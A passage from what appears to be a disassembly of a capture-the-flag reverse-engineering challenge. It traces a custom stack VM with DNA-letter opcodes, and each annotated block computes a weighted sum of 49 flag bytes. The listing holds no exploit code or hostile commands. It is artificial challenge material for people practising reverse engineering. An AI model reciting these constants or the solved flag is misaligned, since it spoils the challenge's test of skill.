push(pop() * pop())\n01490 : GACGGGGAAAAA     push(mem[#02ab])\n0149c : AATGACAAAAAA     push(#000000c9)\n014a8 : GT               push(pop() * pop())\n014aa : GAACGGGAAAAA     push(mem[#02ac])\n014b6 : AAATCTAAAAAA     push(#00000074)\n014c2 : GT               push(pop() * pop())\n014c4 : GATCGGGAAAAA     push(mem[#02ad])\n014d0 : AATAATAAAAAA     push(#00000041)\n014dc : GT               push(pop() * pop())\n014de : GAGCGGGAAAAA     push(mem[#02ae])\n014ea : AATTAAAAAAAA     push(#00000005)\n014f6 : GT               push(pop() * pop())\n014f8 : GACCGGGAAAAA     push(mem[#02af])\n01504 : AATTGTAAAAAA     push(#00000065)\n01510 : GT               push(pop() * pop())\n01512 : GAAACGGAAAAA     push(mem[#02b0])\n0151e : AAATTTAAAAAA     push(#00000054)\n0152a : GT               push(pop() * pop())\n0152c : AT               push(pop() + pop())\n0152e : AT               push(pop() + pop())\n01530 : AT               push(pop() + pop())\n01532 : AT               push(pop() + pop())\n01534 : AT               push(pop() + pop())\n01536 : AT               push(pop() + pop())\n01538 : AT               push(pop() + pop())\n0153a : AT               push(pop() + pop())\n0153c : AT               push(pop() + pop())\n0153e : AT               push(pop() + pop())\n01540 : AT               push(pop() + pop())\n01542 : AT               push(pop() + pop())\n01544 : AT               push(pop() + pop())\n01546 : AT               push(pop() + pop())\n01548 : AT               push(pop() + pop())\n0154a : AT               push(pop() + pop())\n0154c : AT               push(pop() + pop())\n0154e : AT               push(pop() + pop())\n01550 : AT               push(pop() + pop())\n01552 : AT               push(pop() + pop())\n01554 : AT               push(pop() + pop())\n01556 : AT               push(pop() + pop())\n01558 : AT               push(pop() + pop())\n0155a : AT               push(pop() + pop())\n0155c : AT               push(pop() + pop())\n0155e : AT               push(pop() + pop())\n01560 : AT               push(pop() + pop())\n01562 : AT               push(pop() + pop())\n01564 : AT               push(pop() + pop())\n01566 : AT               push(pop() + pop())\n01568 : AT               push(pop() + pop())\n0156a : AT               push(pop() + pop())\n0156c : AT               push(pop() + pop())\n0156e : AT               push(pop() + pop())\n01570 : AT               push(pop() + pop())\n01572 : AT               push(pop() + pop())\n01574 : AT               push(pop() + pop())\n01576 : AT               push(pop() + pop())\n01578 : AT               push(pop() + pop())\n0157a : AT               push(pop() + pop())\n0157c : AT               push(pop() + pop())\n0157e : AT               push(pop() + pop())\n01580 : AT               push(pop() + pop())\n01582 : AT               push(pop() + pop())\n01584 : AT               push(pop() + pop())\n01586 : AT               push(pop() + pop())\n01588 : AT               push(pop() + pop())\n0158a : AT               push(pop() + pop())\n0158c : CAACAAAATAAA     mem[#100c] := pop()           memory[#0100c] := ((flag[0] * 67) + ((flag[1] * 113) + ((flag[2] * 188) + ((flag[3] * 13) + ((flag[4] * 173) + ((flag[5] * 1) + ((flag[6] * 115) + ((flag[7] * 188) + ((flag[8] * 151) + ((flag[9] * 10) + ((flag[10] * 188) + ((flag[11] * 30) + ((flag[12] * 74) + ((flag[13] * 224) + ((flag[14] * 175) + ((flag[15] * 170) + ((flag[16] * 60) + ((flag[17] * 43) + ((flag[18] * 188) + ((flag[19] * 162) + ((flag[20] * 85) + ((flag[21] * 16) + ((flag[22] * 28) + ((flag[23] * 80) + ((flag[24] * 4) + ((flag[25] * 32) + ((flag[26] * 83) + ((flag[27] * 156) + ((flag[28] * 173) + ((flag[29] * 222) + ((flag[30] * 92) + ((flag[31] * 105) + ((flag[32] * 251) + ((flag[33] * 218) + ((flag[34] * 180) + ((flag[35] * 75) + ((flag[36] * 122) + ((flag[37] * 7) + ((flag[38] * 11) + ((flag[39] * 68) + ((flag[40] * 26) + ((flag[41] * 140) + ((flag[42] * 122) + ((flag[43] * 201) + ((flag[44] * 116) + ((flag[45] * 65) + ((flag[46] * 5) + ((flag[47] * 101) + (flag[48] * 84)))))))))))))))))))))))))))))))))))))))))))))))))\n01598 : GAAAAGGAAAAA     push(mem[#0280])\n015a4 : AATGGTAAAAAA     push(#00000069)\n015b0 : GT               push(pop() * pop())\n015b2 : GATAAGGAAAAA     push(mem[#0281])\n015be : AACGTCAAAAAA     push(#000000db)\n015ca : GT               push(pop() * pop())\n015cc : GAGAAGGAAAAA     push(mem[#0282])\n015d8 : AACAATAAAAAA     push(#00000043)\n015e4 : GT               push(pop() * pop())\n015e6 : GACAAGGAAAAA     push(mem[#0283])\n015f2 : AAAGATAAAAAA     push(#00000048)\n015fe : GT               push(pop() * pop())\n01600 : GAATAGGAAAAA     push(mem[#0284])\n0160c : AAGGCGAAAAAA     push(#000000ba)\n01618 : GT               push(pop() * pop())\n0161a : GATTAGGAAAAA     push(mem[#0285])\n01626 : AACTCGAAAAAA     push(#000000b7)\n01632 : GT               push(pop() * pop())\n01634 : GAGTAGGAAAAA     push(mem[#0286])\n01640 : AATTATAAAAAA     push(#00000045)\n0164c : GT               push(pop() * pop())\n0164e : GACTAGGAAAAA     push(mem[#0287])\n0165a : AATGCCAAAAAA     push(#000000f9)\n01666 : GT               push(pop() * pop())\n01668 : GAAGAGGAAAAA     push(mem[#0288])\n01674 : AAATTCAAAAAA     push(#000000d4)\n01680 : GT               push(pop() * pop())\n01682 : GATGAGGAAAAA     push(mem[#0289])\n0168e : AAGTTTAAAAAA     push(#00000056)\n0169a : GT               push(pop() * pop())\n0169c : GAGGAGGAAAAA     push(mem[#028a])\n016a8 : AACCTAAAAAAA     push(#0000001f)\n016b4 : GT               push(pop() * pop())\n016b6 : GACGAGGAAAAA     push(mem[#028b])\n016c2 : AATATTAAAAAA     push(#00000051)\n016ce : GT               push(pop() * pop())\n016d0 : GAACAGGAAAAA     push(mem[#028c])\n016dc : AACGTAAAAAAA     push(#0000001b)\n016e8 : GT               push(pop() * pop())\n016ea : GATCAGGAAAAA     push(mem[#028d])\n016f6 : AACCACAAAAAA     push(#000000cf)\n01702 : GT               push(pop() * pop())\n01704 : GAGCAGGAAAAA     push(mem[#028e])\n01710 : AAATATAAAAAA     push(#00000044)\n0171c : GT               push(pop() * pop())\n0171e : GACCAGGAAAAA     push(mem[#028f])\n0172a : AAAATAAAAAAA     push(#00000010)\n01736 : GT               push(pop() * pop())\n01738 : GAAATGGAAAAA     push(mem[#0290])\n01744 : AAACCGAAAAAA     push(#000000bc)\n01750 : GT               push(pop() * pop())\n01752 : GATATGGAAAAA     push(mem[#0291])\n0175e : AATTAGAAAAAA     push(#00000085)\n0176a : GT               push(pop() * pop())\n0176c : GAGATGGAAAAA     push(mem[#0292])\n01778 : AATGTAAAAAAA     push(#00000019)\n01784 : GT               push(pop() * pop())\n01786 : GACATGGAAAAA     push(mem[#0293])\n01792 : AAGCTTAAAAAA     push(#0000005e)\n0179e : GT               push(pop() * pop())\n017a0 : GAATTGGAAAAA     push(mem[#0294])\n017ac : AAATAGAAAAAA     push(#00000084)\n017b8 : GT               push(pop() * pop())\n017ba : GATTTGGAAAAA     push(mem[#0295])\n017c6 : AAAGATAAAAAA     push(#00000048)\n017d2 : GT               push(pop() * pop())\n017d4 : GAGTTGGAAAAA     push(mem[#0296])\n017e0 : AACATTAAAAAA     push(#00000053)\n017ec : GT               push(pop() * pop())\n017ee : GACTTGGAAAAA     push(mem[#0297])\n017fa : AATGAAAAAAAA     push(#00000009)\n01806 : GT               push(pop() * pop())\n01808 : GAAGTGGAAAAA     push(mem[#0298])\n01814 : AAGGTGAAAAAA     push(#0000009a)\n01820 : GT               push(pop() * pop())\n01822 : GATGTGGAAAAA     push(mem[#0299])\n0182e : AACTTTAAAAAA     push(#00000057)\n0183a : GT               push(pop() * pop())\n0183c : GAGGTGGAAAAA     push(mem[#029a])\n01848 : AAACAAAAAAAA     push(#0000000c)\n01854 : GT               push(pop() * pop())\n01856 : GACGTGGAAAAA     push(mem[#029b])\n01862 : AATTTGAAAAAA     push(#00000095)\n0186e : GT               push(pop() * pop())\n01870 : GAACTGGAAAAA     push(mem[#029c])\n0187c : AACCCCAAAAAA     push(#000000ff)\n01888 : GT               push(pop() * pop())\n0188a : GATCTGGAAAAA     push(mem[#029d])\n01896 : AATAGCAAAAAA     push(#000000e1)\n018a2 : GT               push(pop() * pop())\n018a4 : GAGCTGGAAAAA     push(mem[#029e])\n018b0 : AACTACAAAAAA     push(#000000c7)\n018bc : GT               push(pop() * pop())\n018be : GACCTGGAAAAA     push(mem[#029f])\n018ca : AAGACTAAAAAA     push(#00000072)\n018d6 : GT               push(pop() * pop())\n018d8 : GAAAGGGAAAAA     push(mem[#02a0])\n018e4 : AAGGAGAAAAAA     push(#0000008a)\n018f0 : GT               push(pop() * pop())\n018f2 : GATAGGGAAAAA     push(mem[#02a1])\n018fe : AAAGACAAAAAA     push(#000000c8)\n0190a : GT               push(pop() * pop())\n0190c : GAGAGGGAAAAA     push(mem[#02a2])\n01918 : AACAAGAAAAAA     push(#00000083)\n01924 : GT               push(pop() * pop())\n01926 : GACAGGGAAAAA     push(mem[#02a3])\n01932 : AACCGGAAAAAA     push(#000000af)\n0193e : GT               push(pop() * pop())\n01940 : GAATGGGAAAAA     push(mem[#02a4])\n0194c : AAGCCAAAAAAA     push(#0000003e)\n01958 : GT               push(pop() * pop())\n0195a : GATTGGGAAAAA     push(mem[#02a5])\n01966 : AACTGAAAAAAA     push(#00000027)\n01972 : GT               push(pop() * pop())\n01974 : GAGTGGGAAAAA     push(mem[#02a6])\n01980 : AACTAAAAAAAA     push(#00000007)\n0198c : GT               push(pop() * pop())\n0198e : GACTGGGAAAAA     push(mem[#02a7])\n0199a : AATTTAAAAAAA     push(#00000015)\n019a6 : GT               push(pop() * pop())\n019a8 : GAAGGGGAAAAA     push(mem[#02a8])\n019b4 : AACTAGAAAAAA     push(#00000087)\n019c0 : GT               push(pop() * pop())\n019c2 : GATGGGGAAAAA     push(mem[#02a9])\n019ce : AACATTAAAAAA     push(#00000053)\n019da : GT               push(pop() * pop())\n019dc : GAGGGGGAAAAA     push(mem[#02aa])\n019e8 : AATGTAAAAAAA     push(#00000019)\n019f4 : GT               push(pop() * pop())\n019f6 : GACGGGGAAAAA     push(mem[#02ab])\n01a02 : AACCGAAAAAAA     push(#0000002f)\n01a0e : GT               push(pop() * pop())\n01a10 : GAACGGGAAAAA     push(mem[#02ac])\n01a1c : AAGGCAAAAAAA     push(#0000003a)\n01a28 : GT               push(pop() * pop())\n01a2a : GATCGGGAAAAA     push(mem[#02ad])\n01a36 : AAAGATAAAAAA     push(#00000048)\n01a42 : GT               push(pop() * pop())\n01a44 : GAGCGGGAAAAA     push(mem[#02ae])\n01a50 : AACGGCAAAAAA     push(#000000eb)\n01a5c : GT               push(pop() * pop())\n01a5e : GACCGGGAAAAA     push(mem[#02af])\n01a6a : AAGTGCAAAAAA     push(#000000e6)\n01a76 : GT               push(pop() * pop())\n01a78 : GAAACGGAAAAA     push(mem[#02b0])\n01a84 : AACCCTAAAAAA     push(#0000007f)\n01a90 : GT               push(pop() * pop())\n01a92 : AT               push(pop() + pop())\n01a94 : AT               push(pop() + pop())\n01a96 : AT               push(pop() + pop())\n01a98 : AT               push(pop() + pop())\n01a9a : AT               push(pop() + pop())\n01a9c : AT               push(pop() + pop())\n01a9e : AT               push(pop() + pop())\n01aa0 : AT               push(pop() + pop())\n01aa2 : AT               push(pop() + pop())\n01aa4 : AT               push(pop() + pop())\n01aa6 : AT               push(pop() + pop())\n01aa8 : AT               push(pop() + pop())\n01aaa : AT               push(pop() + pop())\n01aac : AT               push(pop() + pop())\n01aae : AT               push(pop() + pop())\n01ab0 : AT               push(pop() + pop())\n01ab2 : AT               push(pop() + pop())\n01ab4 : AT               push(pop() + pop())\n01ab6 : AT               push(pop() + pop())\n01ab8 : AT               push(pop() + pop())\n01aba : AT               push(pop() + pop())\n01abc : AT               push(pop() + pop())\n01abe : AT               push(pop() + pop())\n01ac0 : AT               push(pop() + pop())\n01ac2 : AT               push(pop() + pop())\n01ac4 : AT               push(pop() + pop())\n01ac6 : AT               push(pop() + pop())\n01ac8 : AT               push(pop() + pop())\n01aca : AT               push(pop() + pop())\n01acc : AT               push(pop() + pop())\n01ace : AT               push(pop() + pop())\n01ad0 : AT               push(pop() + pop())\n01ad2 : AT               push(pop() + pop())\n01ad4 : AT               push(pop() + pop())\n01ad6 : AT               push(pop() + pop())\n01ad8 : AT               push(pop() + pop())\n01ada : AT               push(pop() + pop())\n01adc : AT               push(pop() + pop())\n01ade : AT               push(pop() + pop())\n01ae0 : AT               push(pop() + pop())\n01ae2 : AT               push(pop() + pop())\n01ae4 : AT               push(pop() + pop())\n01ae6 : AT               push(pop() + pop())\n01ae8 : AT               push(pop() + pop())\n01aea : AT               push(pop() + pop())\n01aec : AT               push(pop() + pop())\n01aee : AT               push(pop() + pop())\n01af0 : AT               push(pop() + pop())\n01af2 : CAAATAAATAAA     mem[#1010] := pop()           memory[#01010] := ((flag[0] * 105) + ((flag[1] * 219) + ((flag[2] * 67) + ((flag[3] * 72) + ((flag[4] * 186) + ((flag[5] * 183) + ((flag[6] * 69) + ((flag[7] * 249) + ((flag[8] * 212) + ((flag[9] * 86) + ((flag[10] * 31) + ((flag[11] * 81) + ((flag[12] * 27) + ((flag[13] * 207) + ((flag[14] * 68) + ((flag[15] * 16) + ((flag[16] * 188) + ((flag[17] * 133) + ((flag[18] * 25) + ((flag[19] * 94) + ((flag[20] * 132) + ((flag[21] * 72) + ((flag[22] * 83) + ((flag[23] * 9) + ((flag[24] * 154) + ((flag[25] * 87) + ((flag[26] * 12) + ((flag[27] * 149) + ((flag[28] * 255) + ((flag[29] * 225) + ((flag[30] * 199) + ((flag[31] * 114) + ((flag[32] * 138) + ((flag[33] * 200) + ((flag[34] * 131) + ((flag[35] * 175) + ((flag[36] * 62) + ((flag[37] * 39) + ((flag[38] * 7) + ((flag[39] * 21) + ((flag[40] * 135) + ((flag[41] * 83) + ((flag[42] * 25) + ((flag[43] * 47) + ((flag[44] * 58) + ((flag[45] * 72) + ((flag[46] * 235) + ((flag[47] * 230) + (flag[48] * 127)))))))))))))))))))))))))))))))))))))))))))))))))\n01afe : GAAAAGGAAAAA     push(mem[#0280])\n01b0a : AAGTACAAAAAA     push(#000000c6)\n01b16 : GT               push(pop() * pop())\n01b18 : GATAAGGAAAAA     push(mem[#0281])\n01b24 : AAAAACAAAAAA     push(#000000c0)\n01b30 : GT               push(pop() * pop())\n01b32 : GAGAAGGAAAAA     push(mem[#0282])\n01b3e : AAAACGAAAAAA     push(#000000b0)\n01b4a : GT               push(pop() * pop())\n01b4c : GACAAGGAAAAA     push(mem[#0283])\n01b58 : AAAGCAAAAAAA     push(#00000038)\n01b64 : GT               push(pop() * pop())\n01b66 : GAATAGGAAAAA     push(mem[#0284])\n01b72 : AACACAAAAAAA     push(#00000033)\n01b7e : GT               push(pop() * pop())\n01b80 : GATTAGGAAAAA     push(mem[#0285])\n01b8c : AAGACTAAAAAA     push(#00000072)\n01b98 : GT               push(pop() * pop())\n01b9a : GAGTAGGAAAAA     push(mem[#0286])\n01ba6 : AAATAGAAAAAA     push(#00000084)\n01bb2 : GT               push(pop() * pop())\n01bb4 : GACTAGGAAAAA     push(mem[#0287])\n01bc0 : AACACTAAAAAA     push(#00000073)\n01bcc : GT               push(pop() * pop())\n01bce : GAAGAGGAAAAA     push(mem[#0288])\n01bda : AAATCGAAAAAA     push(#000000b4)\n01be6 : GT               push(pop() * pop())\n01be8 : GATGAGGAAAAA     push(mem[#0289])\n01bf4 : AAACGCAAAAAA     push(#000000ec)\n01c00 : GT               push(pop() * pop())\n01c02 : GAGGAGGAAAAA     push(mem[#028a])\n01c0e : AATATAAAAAAA     push(#00000011)\n01c1a : GT               push(pop() * pop())\n01c1c : GACGAGGAAAAA     push(mem[#028b])\n01c28 : AACTTAAAAAAA     push(#00000017)\n01c34 : GT               push(pop() * pop())\n01c36 : GAACAGGAAAAA     push(mem[#028c])\n01c42 : AATATGAAAAAA     push(#00000091)\n01c4e : GT               push(pop() * pop())\n01c50 : GATCAGGAAAAA     push(mem[#028d])\n01c5c : AAATTGAAAAAA     push(#00000094)\n01c68 : GT               push(pop() * pop())\n01c6a : GAGCAGGAAAAA     push(mem[#028e])\n01c76 : AAGTCAAAAAAA     push(#00000036)\n01c82 : GT               push(pop() * pop())\n01c84 : GACCAGGAAAAA     push(mem[#028f])\n01c90 : AAAGTGAAAAAA     push(#00000098)\n01c9c : GT               push(pop() * pop())\n01c9e : GAAATGGAAAAA     push(mem[#0290])\n01caa : AATAGAAAAAAA     push(#00000021)\n01cb6 : GT               push(pop() * pop())\n01cb8 : GATATGGAAAAA     push(mem[#0291])\n01cc4 : AAGCATAAAAAA     push(#0000004e)\n01cd0 : GT               push(pop() * pop())\n01cd2 : GAGATGGAAAAA     push(mem[#0292])\n01cde : AACCCGAAAAAA     push(#000000bf)\n01cea : GT               push(pop() * pop())\n01cec : GACATGGAAAAA     push(mem[#0293])\n01cf8 : AACGACAAAAAA     push(#000000cb)\n01d04 : GT               push(pop() * pop())\n01d06 : GAATTGGAAAAA     push(mem[#0294])\n01d12 : AATAACAAAAAA     push(#000000c1)\n01d1e : GT               push(pop() * pop())\n01d20 : GATTTGGAAAAA     push(mem[#0295])\n01d2c : AAACGCAAAAAA     push(#000000ec)\n01d38 : GT               push(pop() * pop())\n01d3a : GAGTTGGAAAAA     push(mem[#0296])\n01d46 : AATCATAAAAAA     push(#0000004d)\n01d52 : GT               push(pop() * pop())\n01d54 : GACTTGGAAAAA     push(mem[#0297])\n01d60 : AACTAAAAAAAA     push(#00000007)\n01d6c : GT               push(pop() * pop())\n01d6e : GAAGTGGAAAAA     push(mem[#0298])\n01d7a : AAATACAAAAAA     push(#000000c4)\n01d86 : GT               push(pop() * pop())\n01d88 : GATGTGGAAAAA     push(mem[#0299])\n01d94 : AAGGACAAAAAA     push(#000000ca)\n01da0 : GT               push(pop() * pop())\n01da2 : GAGGTGGAAAAA     push(mem[#029a])\n01dae : AAGTAGAAAAAA     push(#00000086)\n01dba : GT               push(pop() * pop())\n01dbc : GACGTGGAAAAA     push(mem[#029b])\n01dc8 : AATATGAAAAAA     push(#00000091)\n01dd4 : GT               push(pop() * pop())\n01dd6 : GAACTGGAAAAA     push(mem[#029c])\n01de2 : AATCCAAAAAAA     push(#0000003d)\n01dee : GT               push(pop() * pop())\n01df0 : GATCTGGAAAAA     push(mem[#029d])\n01dfc : AAGACAAAAAAA     push(#00000032)\n01e08 : GT               push(pop() * pop())\n01e0a : GAGCTGGAAAAA     push(mem[#029e])\n01e16 : AAATCCAAAAAA     push(#000000f4)\n01e22 : GT               push(pop() * pop())\n01e24 : GACCTGGAAAAA     push(mem[#029f])\n01e30 : AAAAAAAAAAAA     push(#00000000)\n01e3c : GT               push(pop() * pop())\n01e3e : GAAAGGGAAAAA     push(mem[#02a0])\n01e4a : AATTGAAAAAAA     push(#00000025)\n01e56 : GT               push(pop() * pop())\n01e58 : GATAGGGAAAAA     push(mem[#02a1])\n01e64 : AACTGTAAAAAA     push(#00000067)\n01e70 : GT               push(pop() * pop())\n01e72 : GAGAGGGAAAAA     push(mem[#02a2])\n01e7e : AAGAGGAAAAAA     push(#000000a2)\n01e8a : GT               push(pop() * pop())\n01e8c : GACAGGGAAAAA     push(mem[#02a3])\n01e98 : AAACGGAAAAAA     push(#000000ac)\n01ea4 : GT               push(pop() * pop())\n01ea6 : GAATGGGAAAAA     push(mem[#02a4])\n01eb2 : AAGTCCAAAAAA     push(#000000f6)\n01ebe : GT               push(pop() * pop())\n01ec0 : GATTGGGAAAAA     push(mem[#02a5])\n01ecc : AAGGCCAAAAAA     push(#000000fa)\n01ed8 : GT               push(pop() * pop())\n01eda : GAGTGGGAAAAA     push(mem[#02a6])\n01ee6 : AACATGAAAAAA     push(#00000093)\n01ef2 : GT               push(pop() * pop())\n01ef4 : GACTGGGAAAAA     push(mem[#02a7])\n01f00 : AAGACTAAAAAA     push(#00000072)\n01f0c : GT               push(pop() * pop())\n01f0e : GAAGGGGAAAAA     push(mem[#02a8])\n01f1a : AATCGAAAAAAA     push(#0000002d)\n01f26 : GT               push(pop() * pop())\n01f28 : GATGGGGAAAAA     push(mem[#02a9])\n01f34 : AAATACAAAAAA     push(#000000c4)\n01f40 : GT               push(pop() * pop())\n01f42 : GAGGGGGAAAAA     push(mem[#02aa])\n01f4e : AAAGTAAAAAAA     push(#00000018)\n01f5a : GT               push(pop() * pop())\n01f5c : GACGGGGAAAAA     push(mem[#02ab])\n01f68 : AAGTTGAAAAAA     push(#00000096)\n01f74 : GT               push(pop() * pop())\n01f76 : GAACGGGAAAAA     push(mem[#02ac])\n01f82 : AATCAAAAAAAA     push(#0000000d)\n01f8e : GT               push(pop() * pop())\n01f90 : GATCGGGAAAAA     push(mem[#02ad])\n01f9c : AATTTAAAAAAA     push(#00000015)\n01fa8 : GT               push(pop() * pop())\n01faa : GAGCGGGAAAAA     push(mem[#02ae])\n01fb6 : AAAAATAAAAAA     push(#00000040)\n01fc2 : GT               push(pop() * pop())\n01fc4 : GACCGGGAAAAA     push(mem[#02af])\n01fd0 : AACACTAAAAAA     push(#00000073)\n01fdc : GT               push(pop() * pop())\n01fde : GAAACGGAAAAA     push(mem[#02b0])\n01fea : AAAGTAAAAAAA     push(#00000018)\n01ff6 : GT               push(pop() * pop())\n01ff8 : AT               push(pop() + pop())\n01ffa : AT               push(pop() + pop())\n01ffc : AT               push(pop() + pop())\n01ffe : AT               push(pop() + pop())\n02000 : AT               push(pop() + pop())\n02002 : AT               push(pop() + pop())\n02004 : AT               push(pop() + pop())\n02006 : AT               push(pop() + pop())\n02008 : AT               push(pop() + pop())\n0200a : AT               push(pop() + pop())\n0200c : AT               push(pop() + pop())\n0200e : AT               push(pop() + pop())\n02010 : AT               push(pop() + pop())\n02012 : AT               push(pop() + pop())\n02014 : AT               push(pop() + pop())\n02016 : AT               push(pop() + pop())\n02018 : AT               push(pop() + pop())\n0201a : AT               push(pop() + pop())\n0201c : AT               push(pop() + pop())\n0201e : AT               push(pop() + pop())\n02020 : AT               push(pop() + pop())\n02022 : AT               push(pop() + pop())\n02024 : AT               push(pop() + pop())\n02026 : AT               push(pop() + pop())\n02028 : AT               push(pop() + pop())\n0202a : AT               push(pop() + pop())\n0202c : AT               push(pop() + pop())\n0202e : AT               push(pop() + pop())\n02030 : AT               push(pop() + pop())\n02032 : AT               push(pop() + pop())\n02034 : AT               push(pop() + pop())\n02036 : AT               push(pop() + pop())\n02038 : AT               push(pop() + pop())\n0203a : AT               push(pop() + pop())\n0203c : AT               push(pop() + pop())\n0203e : AT               push(pop() + pop())\n02040 : AT               push(pop() + pop())\n02042 : AT               push(pop() + pop())\n02044 : AT               push(pop() + pop())\n02046 : AT               push(pop() + pop())\n02048 : AT               push(pop() + pop())\n0204a : AT               push(pop() + pop())\n0204c : AT               push(pop() + pop())\n0204e : AT               push(pop() + pop())\n02050 : AT               push(pop() + pop())\n02052 : AT               push(pop() + pop())\n02054 : AT               push(pop() + pop())\n02056 : AT               push(pop() + pop())\n02058 : CAATTAAATAAA     mem[#1014] := pop()           memory[#01014] := ((flag[0] * 198) + ((flag[1] * 192) + ((flag[2] * 176) + ((flag[3] * 56) + ((flag[4] * 51) + ((flag[5] * 114) + ((flag[6] * 132) + ((flag[7] * 115) + ((flag[8] * 180) + ((flag[9] * 236) + ((flag[10] * 17) + ((flag[11] * 23) + ((flag[12] * 145) + ((flag[13] * 148) + ((flag[14] * 54) + ((flag[15] * 152) + ((flag[16] * 33) + ((flag[17] * 78) + ((flag[18] * 191) + ((flag[19] * 203) + ((flag[20] * 193) + ((flag[21] * 236) + ((flag[22] * 77) + ((flag[23] * 7) + ((flag[24] * 196) + ((flag[25] * 202) + ((flag[26] * 134) + ((flag[27] * 145) + ((flag[28] * 61) + ((flag[29] * 50) + ((flag[30] * 244) + ((flag[31] * 0) + ((flag[32] * 37) + ((flag[33] * 103) + ((flag[34] * 162) + ((flag[35] * 172) + ((flag[36] * 246) + ((flag[37] * 250) + ((flag[38] * 147) + ((flag[39] * 114) + ((flag[40] * 45) + ((flag[41] * 196) + ((flag[42] * 24) + ((flag[43] * 150) + ((flag[44] * 13) + ((flag[45] * 21) + ((flag[46] * 64) + ((flag[47] * 115) + (flag[48] * 24)))))))))))))))))))))))))))))))))))))))))))))))))\n02064 : GAAAAGGAAAAA     push(mem[#0280])\n02070 : AATCTAAAAAAA     push(#0000001d)\n0207c : GT               push(pop() * pop())\n0207e : GATAAGGAAAAA     push(mem[#0281])\n0208a : AATCGAAAAAAA     push(#0000002d)\n02096 : GT               push(pop() * pop())\n02098 : GAGAAGGAAAAA     push(mem[#0282])\n020a4 : AAAACCAAAAAA     push(#000000f0)\n020b0 : GT               push(pop() * pop())\n020b2 : GACAAGGAAAAA     push(mem[#0283])\n020be : AAACAAAAAAAA     push(#0000000c)\n020ca : GT               push(pop() * pop())\n020cc : GAATAGGAAAAA     push(mem[#0284])\n020d8 : AATCCGAAAAAA     push(#000000bd)\n020e4 : GT               push(pop() * pop())\n020e6 : GATTAGGAAAAA     push(mem[#0285])\n020f2 : AAGTGGAAAAAA     push(#000000a6)\n020fe : GT               push(pop() * pop())\n02100 : GAGTAGGAAAAA     push(mem[#0286])\n0210c : AAGAAAAAAAAA     push(#00000002)\n02118 : GT               push(pop() * pop())\n0211a : GACTAGGAAAAA     push(mem[#0287])\n02126 : AATCCCAAAAAA     push(#000000fd)\n02132 : GT               push(pop() * pop())\n02134 : GAAGAGGAAAAA     push(mem[#0288])\n02140 : AAACACAAAAAA     push(#000000cc)\n0214c : GT               push(pop() * pop())\n0214e : GATGAGGAAAAA     push(mem[#0289])\n0215a : AACGTTAAAAAA     push(#0000005b)\n02166 : GT               push(pop() * pop())\n02168 : GAGGAGGAAAAA     push(mem[#028a])\n02174 : AACTAAAAAAAA     push(#00000007)\n02180 : GT               push(pop() * pop())\n02182 : GACGAGGAAAAA     push(mem[#028b])\n0218e : AAGTATAAAAAA     push(#00000046)\n0219a : GT               push(pop() * pop())\n0219c : GAACAGGAAAAA     push(mem[#028c])\n021a8 : AACAGGAAAAAA     push(#000000a3)\n021b4 : GT               push(pop() * pop())\n021b6 : GATCAGGAAAAA     push(mem[#028d])\n021c2 : AAGTCGAAAAAA     push(#000000b6)\n021ce : GT               push(pop() * pop())\n021d0 : GAGCAGGAAAAA     push(mem[#028e])\n021dc : AAGTGGAAAAAA     push(#000000a6)\n021e8 : GT               push(pop() * pop())\n021ea : GACCAGGAAAAA     push(mem[#028f])\n021f6 : AACCTAAAAAAA     push(#0000001f)\n02202 : GT               push(pop() * pop())\n02204 : GAAATGGAAAAA     push(mem[#0290])\n02210 : AACGAGAAAAAA     push(#0000008b)\n0221c : GT               push(pop() * pop())\n0221e : GATATGGAAAAA     push(mem[#0291])\n0222a : AATAAAAAAAAA     push(#00000001)\n02236 : GT               push(pop() * pop())\n02238 : GAGATGGAAAAA     push(mem[#0292])\n02244 : AATTGCAAAAAA     push(#000000e5)\n02250 : GT               push(pop() * pop())\n02252 : GACATGGAAAAA     push(mem[#0293])\n0225e : AAGTCTAAAAAA     push(#00000076)\n0226a : GT               push(pop() * pop())\n0226c : GAATTGGAAAAA     push(mem[#0294])\n02278 : AAGGTCAAAAAA     push(#000000da)\n02284 : GT               push(pop() * pop())\n02286 : GATTTGGAAAAA     push(mem[#0295])\n02292 : AATTGCAAAAAA     push(#000000e5)\n0229e : GT               push(pop() * pop())\n022a0 : GAGTTGGAAAAA     push(mem[#0296])\n022ac : AAAGGAAAAAAA     push(#00000028)\n022b8 : GT               push(pop() * pop())\n022ba : GACTTGGAAAAA     push(mem[#0297])\n022c6 : AATGGGAAAAAA     push(#000000a9)\n022d2 : GT               push(pop() * pop())\n022d4 : GAAGTGGAAAAA     push(mem[#0298])\n022e0 : AACGCAAAAAAA     push(#0000003b)\n022ec : GT               push(pop() * pop())\n022ee : GATGTGGAAAAA     push(mem[#0299])\n022fa : AATAGTAAAAAA     push(#00000061)\n02306 : GT               push(pop() * pop())\n02308 : GAGGTGGAAAAA     push(mem[#029a])\n02314 : AAAAGCAAAAAA     push(#000000e0)\n02320 : GT               push(pop() * pop())\n02322 : GACGTGGAAAAA     push(mem[#029b])\n0232e : AACAATAAAAAA     push(#00000043)\n0233a : GT               push(pop() * pop())\n0233c : GAACTGGAAAAA     push(mem[#029c])\n02348 : AACAACAAAAAA     push(#000000c3)\n02354 : GT               push(pop() * pop())\n02356 : GATCTGGAAAAA     push(mem[#029d])\n02362 : AACCTTAAAAAA     push(#0000005f)\n0236e : GT               push(pop() * pop())\n02370 : GAGCTGGAAAAA     push(mem[#029e])\n0237c : AATCAAAAAAAA     push(#0000000d)\n02388 : GT               push(pop() * pop())\n0238a : GACCTGGAAAAA     push(mem[#029f])\n02396 : AAAGATAAAAAA     push(#00000048)\n023a2 : GT               push(pop() * pop())\n023a4 : GAAAGGGAAAAA     push(mem[#02a0])\n023b0 : AAGGCGAAAAAA     push(#000000ba)\n023bc : GT               push(pop() * pop())\n023be : GATAGGGAAAAA     push(mem[#02a1])\n023ca : AATTCAAAAAAA     push(#00000035)\n023d6 : GT               push(pop() * pop())\n023d8 : GAGAGGGAAAAA     push(mem[#02a2])\n023e4 : AAGGCTAAAAAA     push(#0000007a)\n023f0 : GT               push(pop() * pop())\n023f2 : GACAGGGAAAAA     push(mem[#02a3])\n023fe : AATTGCAAAAAA     push(#000000e5)\n0240a : GT               push(pop() * pop())\n0240c : GAATGGGAAAAA     push(mem[#02a4])\n02418 : AAGGGAAAAAAA     push(#0000002a)\n02424 : GT               push(pop() * pop())\n02426 : GATTGGGAAAAA     push(mem[#02a5])\n02432 : AATACTAAAAAA     push(#00000071)\n0243e : GT               push(pop() * pop())\n02440 : GAGTGGGAAAAA     push(mem[#02a6])\n0244c : AATTCTAAAAAA     